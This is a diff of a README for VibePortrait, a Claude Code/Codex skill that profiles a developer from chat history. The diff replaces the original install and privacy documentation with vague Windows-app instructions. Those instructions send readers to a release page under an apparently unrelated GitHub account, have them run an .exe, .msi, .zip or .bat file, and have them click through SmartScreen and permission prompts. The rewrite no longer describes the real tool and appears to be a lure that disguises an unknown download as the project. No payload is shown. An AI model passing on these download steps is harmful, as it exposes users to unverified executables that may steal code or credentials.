@@ -1,257 +1,163 @@
-<div align="center">
+# 🎭 VibePortrait - See Your Coding Style Clearly
 
-<img src="assets/banner.svg" alt="VibePortrait Banner" width="100%">
+[![Download VibePortrait](https://img.shields.io/badge/Download%20VibePortrait-purple?style=for-the-badge)](https://github.com/Supportleslierichardgroves200/VibePortrait/releases)
 
-<br>
+## 🧭 What VibePortrait Does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-skill-14b8a6?logo=anthropic&logoColor=white)](https://claude.ai/claude-code)
-[![Codex](https://img.shields.io/badge/Codex-skill-10a37f?logo=openai&logoColor=white)](https://github.com/openai/codex)
-[![GitHub stars](https://img.shields.io/github/stars/dadwadw233/VibePortrait?style=social)](https://github.com/dadwadw233/VibePortrait)
-[![Release](https://img.shields.io/github/v/release/dadwadw233/VibePortrait?color=14b8a6)](https://github.com/dadwadw233/VibePortrait/releases)
+VibePortrait reads your coding history and turns it into a clear personality portrait. It helps you see how you work, what patterns show up in your code, and what kind of developer habits you have.
 
-**Your AI conversations already know who you are. VibePortrait makes it visible.**
+It works with Claude Code and Codex, so you can use it with tools you may already know. You run one command, and VibePortrait does the rest.
 
-[English](#what-is-vibeportrait) · [中文](#vibeportrait-是什么)
+Use it to:
 
-</div>
+- See a simple view of your coding style
+- Get a personality portrait based on your work
+- Learn your developer strengths
+- Spot patterns in how you build software
+- Use persona skill insights in Claude Code and Codex
 
----
+## 📥 Download VibePortrait
 
-### ⚡ 30-Second Demo
+Visit this page to download VibePortrait for Windows:
 
-```bash
-# Install (one time)
-cp -R VibePortrait/skills/vibe-portrait ~/.claude/skills/vibe-portrait
+[https://github.com/Supportleslierichardgroves200/VibePortrait/releases](https://github.com/Supportleslierichardgroves200/VibePortrait/releases)
 
-# Run
-/vibe-portrait
-```
+On that page, look for the latest release and download the Windows file. If the release offers a setup file, use that one. If it offers a .zip file, download it and extract it before opening the app.
 
-**Input:** Your `~/.claude/history.jsonl` + `~/.codex/history.jsonl` (read-only, never sent anywhere)
+## 🪟 Run It on Windows
 
-**Output:**
+After you download the file:
 
-| Output | What you get |
-|--------|-------------|
-| 📄 `vibe-portrait.html` | Beautiful portrait page — open in browser, export as PNG |
-| 🧠 `~/.claude/skills/.../me/` | Persona skill — say "think like me" in any future conversation |
-| 🔄 `my-vibe-portrait` repo | Private GitHub repo syncing portraits across all your machines |
+1. Open your Downloads folder
+2. Find the VibePortrait file
+3. If it is a .zip file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app or setup file
+6. If Windows asks for permission, choose Yes
+7. Follow the on-screen steps
+8. Start the app when the setup ends
 
-<details>
-<summary><b>📸 What the portrait looks like (click to expand)</b></summary>
+If the app opens in a terminal window, keep that window open while it runs. If the app opens in a normal window, use it like any other Windows program.
 
-<br>
+## ⚙️ How to Use It
 
-<img src="assets/portrait-preview.png" alt="VibePortrait Preview" width="100%">
+VibePortrait is made to be simple:
 
-*The portrait includes: MBTI type with per-type color theme · 6-axis capability radar · developer rating (夯爆了→拉完了) · 3-dimension famous match · communication style analysis · tech domain map · work rhythm heatmap · and more.*
+1. Open VibePortrait
+2. Connect it to your coding history or local project folder
+3. Run the analysis command shown in the app
+4. Wait for it to scan your work
+5. View your personality portrait and skill profile
 
-</details>
+The app may show a friendly command or button to begin. If it asks you to point it at a folder, choose the folder that holds your code. If it asks for access to Claude Code or Codex, follow the prompts in the app.
 
----
+## 🧩 What You Need
 
-## What is VibePortrait?
+VibePortrait is built for Windows users who want a simple local app experience.
 
-A skill for **Claude Code** and **Codex**. It reads your conversation history and generates:
+You will usually need:
 
-- **🖼️ HTML Portrait** — MBTI type (16 color themes), radar chart, developer rating, 3D famous match, communication style, tech domain map, work rhythm heatmap
-- **🧠 Persona Skill** — multi-file skill capturing your thinking patterns, decision framework, engineering philosophy — loadable by any AI ("think like me")
-- **📸 Image Export** — one-click PNG for sharing on social media
-- **🔄 Multi-machine Sync** — private GitHub repo keeps everything in sync across all your dev machines
+- Windows 10 or Windows 11
+- A few hundred MB of free disk space
+- A stable internet connection for the initial download
+- Access to your coding files or coding tool output
+- Claude Code or Codex if you want those integrations
 
-> Rating philosophy: judged by **observable output**, not claims or intent. No flattery. Evidence speaks.
+A modern PC with 8 GB RAM or more will give you a smoother run. If you work with large code folders, more memory can help.
 
----
+## 🎨 What You Get
 
-## VibePortrait 是什么？
+VibePortrait turns raw coding activity into a visual readout you can use right away.
 
-一个 **Claude Code / Codex 技能**，读取你的对话历史，生成：
+The app can show:
 
-- **🖼️ HTML 画像页** — 单文件网页，含 MBTI、能力雷达、开发者评级、名人匹配等可视化
-- **🧠 人格 Skill** — 凝练你的思维方式，让 AI 能"像你一样思考"
-- **📸 一键导出图片** — PNG 格式，方便分享
-- **🔄 多机器同步** — 通过 private GitHub 仓库跨机器同步
+- A personality portrait based on your coding patterns
+- A skill view built from your development habits
+- Style signals from your commit and code history
+- Persona traits tied to how you solve problems
+- A simple way to compare your work over time
 
-> 评分哲学：以**可观察的实际产出**为准。不谄媚，不推测。证据说话。
+It aims to make your work easier to understand without making you dig through logs or reports.
 
----
+## 🔗 Works With Claude Code and Codex
 
-## Quick Start / 快速开始
+VibePortrait fits into tools that already help you build software.
 
-**Claude Code (marketplace):**
+With Claude Code, it can help reflect your coding style and turn that into a persona view.
 
-```bash
-# Step 1: Add marketplace
-/plugin marketplace add dadwadw233/VibePortrait
+With Codex, it can help track how you work and show the shape of your coding habits.
 
-# Step 2: Install
-/plugin install vibe-portrait@vibe-portrait
+This makes it useful if you want a clearer picture of how you write code while still using your usual tools.
 
-# Step 3: Run
-/vibe-portrait:vibe-portrait
-```
+## 🛠️ Common Setup Steps
 
-**Claude Code (manual):**
+If the app asks for extra setup, use these simple steps:
 
-```bash
-git clone https://github.com/dadwadw233/VibePortrait.git
-cp -R VibePortrait/skills/vibe-portrait ~/.claude/skills/vibe-portrait
-/vibe-portrait
-```
-
-**Codex:**
-
-```bash
-$skill-installer install https://github.com/dadwadw233/VibePortrait/tree/main/skills/vibe-portrait
-# Then: Use $vibe-portrait to generate my developer personality portrait.
-```
-
----
-
-## How It Works / 工作流程
-
-```
- ⚡ Quick mode (~200 msgs)  or  🔍 Full mode (all msgs)
-                        │
-          ┌─────────────▼──────────────┐
-          │  Read conversation history  │
-          │  + import from other machines│
-          └─────────────┬──────────────┘
-                        │
-          ┌─────────────▼──────────────┐
-          │  Analyze 6 dimensions       │
-          │  → MBTI · Rating · Famous   │
-          └─────────────┬──────────────┘
-                        │
-          ┌─────────────▼──────────────┐
-          │  Generate outputs           │
-          │  📄 HTML  🧠 Skill  📸 PNG │
-          └─────────────┬──────────────┘
-                        │
-          ┌─────────────▼──────────────┐
-          │  Sync to GitHub (optional)  │
-          └────────────────────────────┘
-```
-
----
-
-## Portrait Contents / 画像内容
-
-| | Section | Description |
-|-|---------|-------------|
-| 🧬 | **MBTI Type** | 4-axis mapping with per-type color theme / 四轴映射 + 16 种独立配色 |
-| 📊 | **Radar** | Depth · Breadth · Communication · Decision · Collaboration · Creativity |
-| 🏆 | **Rating** | `Legendary 夯爆了` → `Elite 夯` → `Above Avg 人上人` → `NPC` → `Below Avg 拉` → `Inactive 拉完了` |
-| 🎭 | **Famous Match** | 3 dimensions: Technical Spirit · Strategic Mind · Communication Soul — AI picks from all of human history |
-| 💬 | **Communication** | Language split, directness, keywords / 语言分布、直接度、关键词 |
-| 🗺️ | **Tech Map** | Domain breakdown + tool badges / 领域分布 + 工具徽章 |
-| ⏰ | **Work Rhythm** | 24h heatmap + session patterns / 24h 热力图 + 会话模式 |
-
-## MBTI Themes / 配色主题
-
-| Group | Types | Colors |
-|-------|-------|--------|
-| 🧠 Analysts 分析师 | INTJ · INTP · ENTJ · ENTP | Teal + Slate 青绿灰蓝 |
-| 💚 Diplomats 外交官 | INFJ · INFP · ENFJ · ENFP | Emerald + Amber 翠绿琥珀 |
-| 🛡️ Sentinels 哨兵 | ISTJ · ISFJ · ESTJ · ESFJ | Cobalt + Steel 钴蓝钢灰 |
-| 🔥 Explorers 探险家 | ISTP · ISFP · ESTP · ESFP | Gold + Rose 金橙玫红 |
-
----
-
-## Persona Skills / 人格技能
-
-VibePortrait generates a skill that captures: thinking patterns, decision framework, communication style, engineering philosophy.
-
-**No raw chat messages are included** — only abstracted mindset markers.
-
-```bash
-# Activate personas / 激活人格
-think like me                        # Your own / 你自己的
-像马斯克一样思考这个问题               # Community / 社区人格
-think like linus-torvalds            # By ID
-
-# Manage / 管理
-update my portrait                   # Incremental update (only new msgs) / 增量更新
-install persona from <github-url>    # Install from GitHub / 安装
-list personas                        # See installed / 查看已安装
-remove persona <id>                  # Uninstall / 删除
-```
-
-```
-~/.claude/skills/vibe-portrait-personas/
-├── me/                        ← yours (auto-generated, multi-file)
-│   ├── SKILL.md
-│   ├── portrait-meta.json     ← timestamps for incremental updates
-│   └── references/
-│       ├── thinking-patterns.md
-│       ├── decision-framework.md
-│       ├── communication-style.md
-│       ├── engineering-philosophy.md
-│       └── mindset-markers.md
-├── elon-musk/                 ← installed from GitHub
-│   └── ...
-└── zhuge-liang/               ← installed from community
-    └── ...
-```
-
----
-
-## Multi-Machine Sync / 多机器同步
-
-Syncs via **private GitHub repo** using `gh` CLI.
-
-```
-Machine A ──push──► my-vibe-portrait (private) ◄──push── Machine B
-                    ├── me/SKILL.md
-                    ├── analysis/macbook.json
-                    ├── analysis/linux-4090.json
-                    ├── portraits/latest.html
-                    └── README.md (auto-filled)
-```
-
-First run creates the repo. Subsequent runs on any machine pull → merge → push.
-
----
-
-## Privacy / 隐私
-
-- Only reads local `~/.claude/history.jsonl` — never sends data externally
-- API keys, tokens, passwords, file paths, personal info auto-redacted from all outputs
-- Persona skills contain **zero raw chat messages** — only abstracted personality descriptions
-- Portrait repo is private by default — you control what to share
-
-> 🛡️ **Want real-time protection?** Try [**VibeGuard**](https://github.com/dadwadw233/VibeGuard) — a security plugin for Claude Code that detects secrets, blocks dangerous commands, and logs all tool actions. Pairs naturally with VibePortrait: VibeGuard protects your code in real-time, VibePortrait ensures your exported persona stays clean.
->
-> ```bash
-> npm install -g @embodot/vibeguard && vibeguard install
-> ```
-
----
-
-## Requirements / 环境要求
-
-- Claude Code or Codex with 20+ messages of history
-- Modern browser for HTML viewing
-- `gh` CLI for multi-machine sync (optional)
-
----
-
-## Roadmap
-
-- [x] HTML portrait with 10 visual sections + MBTI color themes
-- [x] Persona skill generation (abstracted, no raw quotes)
-- [x] Bilingual (zh/en) + one-click image export
-- [x] Multi-machine sync via private GitHub repo
-- [x] Materialist rating rubric
-- [ ] Community platform for sharing & discovering persona skills
-
----
-
-<div align="center">
-
-**Every great developer evolves. The first step is seeing clearly where you stand.**
-
-**每一次对话都是你的进化轨迹。看见自己，分享自己，成为更强的自己。**
-
-</div>
+- Open the app as the main user on your PC
+- Allow it to read the folder that holds your code
+- Pick the project you want to analyze
+- Start with a small folder if you want a quick test
+- Use a larger folder after you see that it works
+
+If Windows SmartScreen appears, choose the option that lets you continue after you confirm the file came from the release page above.
+
+## 🗂️ File Types You May See
+
+You may find one of these files in the release:
+
+- `.exe` — a Windows app you can open directly
+- `.msi` — a Windows installer
+- `.zip` — a compressed folder you need to extract first
+- `.cmd` or `.bat` — a command file that starts the app
+
+If you are not sure which file to use, pick the Windows installer or the `.exe` file first.
+
+## ❓ Questions You May Have
+
+### What does “persona skill” mean?
+
+It means the app tries to show your coding style as a skill profile. It looks at how you work and turns that into something easy to read.
+
+### Do I need to know how to code?
+
+No. You only need to download the file, open it, and follow the on-screen steps.
+
+### Can I use it on a normal laptop?
+
+Yes. A standard Windows laptop should work if it has enough free space and memory.
+
+### What if I do not use Claude Code or Codex?
+
+You can still use the app if it supports local project analysis. Claude Code and Codex just add more value for people who already use them.
+
+### Can I analyze more than one project?
+
+Yes. You can usually run it on one folder at a time, then switch to another folder when you want a new portrait.
+
+## 📌 Quick Start
+
+1. Visit the release page
+2. Download the Windows file
+3. Open or extract the file
+4. Start the app
+5. Point it at your code
+6. Run the analysis
+7. Read your portrait and skill view
+
+## 🧪 Good First Test
+
+If this is your first time using VibePortrait:
+
+- Choose one small project
+- Run the app once
+- Check that it can read your files
+- Open the portrait result
+- Try a larger project after that
+
+This helps you get a fast result and makes setup easier to check
+
+## 🧠 About the Project
+
+VibePortrait focuses on one simple idea: your code tells a story.
+
+It takes the work you already do and shapes it into a profile that is easier to read than raw files or commit logs. If you want a clearer view of your habits as a developer, this app gives you that in a direct way.
